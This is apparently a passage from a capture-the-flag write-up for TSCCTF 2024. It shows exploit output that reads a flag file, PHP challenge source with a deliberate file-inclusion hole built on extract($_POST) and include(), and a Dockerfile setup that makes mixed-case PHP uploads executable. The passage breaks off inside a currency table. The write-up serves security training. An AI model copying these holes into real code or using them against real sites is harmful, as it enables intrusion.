P�������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@ $ python exp.py cat /flag_cr14x5hc \u0026lt;h1\u0026gt;👻 Stage 4 / 4\u0026lt;/h1\u0026gt;\u0026lt;code\u0026gt;\u0026lt;span style=\u0026#34;color: #000000\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;\u0026amp;lt;?php\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;echo\u0026amp;nbsp;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;\u0026amp;lt;h1\u0026amp;gt;👻\u0026amp;nbsp;Stage\u0026amp;nbsp;4\u0026amp;nbsp;/\u0026amp;nbsp;4\u0026amp;lt;/h1\u0026amp;gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;highlight_file\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;__FILE__\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;echo\u0026amp;nbsp;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;\u0026amp;lt;hr\u0026amp;gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;;\u0026lt;br /\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;extract\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$_POST\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;if\u0026amp;nbsp;(isset(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$👀\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;))\u0026amp;nbsp;\u0026lt;br /\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;include(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #0000BB\u0026#34;\u0026gt;$👀\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;br /\u0026gt;else\u0026amp;nbsp;die(\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #DD0000\u0026#34;\u0026gt;\u0026#39;ERROR:\u0026amp;nbsp;👀\u0026amp;nbsp;should\u0026amp;nbsp;be\u0026amp;nbsp;given\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026#34;color: #007700\u0026#34;\u0026gt;);\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/code\u0026gt;\u0026lt;hr\u0026gt;TSC{y0u_4r3_my_0ld_p4l} �B�0���\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@ Flag: TSC{y0u_4r3_my_0ld_p4l}\nPalitan ng pera(賽後解) # Description # It\u0026rsquo;s a currency exchange website.\nAuthor: Vincent55 Official Writeup - https://github.com/Vincent550102/My-CTF-Challenge/tree/main/TSCCTF-2024#palitan-ng-pera\nSource Code # docker-compose.yml version: \u0026#34;3.5\u0026#34; services: exchange: build: context: ./src args: FLAG: TSCCTF{FAKEFLAG} ports: - 33000:80/tcp Dockerfile FROM php:7.4.33-apache COPY . /var/www/html RUN chown -R www-data:www-data /var/www/html \u0026amp;\u0026amp; \\ chmod -R 555 /var/www/html \u0026amp;\u0026amp; \\ chown www-data:www-data /var/www/html/upload \u0026amp;\u0026amp; \\ chmod 775 /var/www/html/upload ARG FLAG RUN echo $FLAG \u0026gt; /flag-`cat /dev/urandom | tr -dc \u0026#39;a-zA-Z0-9\u0026#39; | fold -w 8 | head -n 1` RUN echo \u0026#34;AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP\u0026#34; \u0026gt;\u0026gt;/etc/apache2/apache2.conf USER www-data currency.php :::spoiler Source Code \u0026lt;?php # from https://en.wikipedia.org/wiki/List_of_circulating_currencies # The exchange rate are unrelated to the solution, so they are all set to 0.87 :\u0026gt; $countryData = array( \u0026#34;Afghanistan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AFN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Akrotiri and Dhekelia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Albania\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ALL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Algeria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DZD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Andorra\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Angola\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AOA\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Anguilla\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Antigua and Barbuda\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Argentina\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ARS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Armenia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AMD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Artsakh\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;none\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Aruba\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AWG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ascension Island\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SHP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Australia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AUD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Austria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Azerbaijan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;AZN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bahamas, The\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BSD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bahrain\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BHD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bangladesh\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BDT\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Barbados\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BBD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Belarus\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BYN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Belgium\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Belize\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BZD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Benin\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bermuda\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BMD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bhutan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BTN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bolivia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BOB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bonaire\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bosnia and Herzegovina\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BAM\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Botswana\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BWP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Brazil\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BRL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;British Indian Ocean Territory\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;British Virgin Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Brunei\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BND\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Bulgaria\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BGN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Burkina Faso\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Burundi\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;BIF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cambodia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KHR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cameroon\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Canada\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CAD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cape Verde\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CVE\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cayman Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KYD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Central African Republic\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Chad\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Chile\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CLP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;China, People\u0026#39;s Republic of\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CNY\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Colombia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;COP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Comoros\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KMF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Congo, Democratic Republic of the\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CDF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Congo, Republic of the\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cook Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Costa Rica\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CRC\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Côte d\u0026#39;Ivoire\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Croatia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cuba\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CUP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Curaçao\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ANG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Cyprus\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Czech Republic\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;CZK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Denmark\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DKK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Djibouti\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DJF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Dominica\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Dominican Republic\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DOP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;East Timor\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ecuador\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Egypt\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EGP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;El Salvador\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;USD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Equatorial Guinea\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Eritrea\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ERN\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Estonia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Eswatini\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;SZL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ethiopia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ETB\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Falkland Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;FKP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Faroe Islands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DKK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Fiji\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;FJD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Finland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;France\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;French Polynesia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XPF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;French Southern and Antarctic Lands\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Gabon\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XAF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Gambia, The\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GMD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Georgia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GEL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Germany\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ghana\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GHS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Gibraltar\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GIP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Greece\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Greenland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;DKK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Grenada\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XCD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Guatemala\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GTQ\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Guinea\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GNF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Guinea-Bissau\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;XOF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Guyana\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;GYD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Haiti\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;HTG\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Honduras\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;HNL\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Hong Kong\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;HKD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Hungary\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;HUF\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Iceland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ISK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;India\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;INR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Indonesia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;IDR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Iran\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;IRR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Iraq\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;IQD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Ireland\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Isle of Man\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;none\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Israel\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;ILS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Italy\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Jamaica\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;JMD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Japan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;JPY\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Jersey\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;none\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Jordan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;JOD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kazakhstan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KZT\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kenya\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KES\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kiribati\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;none\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Korea, North\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KPW\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Korea, South\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KRW\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kosovo\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kuwait\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KWD\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Kyrgyzstan\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;KGS\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Laos\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;LAK\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Latvia\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;EUR\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Lebanon\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; \u0026#34;LBP\u0026#34;, \u0026#34;toTWD\u0026#34; =\u0026gt; 0.87), \u0026#34;Lesotho\u0026#34; =\u0026gt; array(\u0026#34;ISO\u0026#34; =\u0026gt; 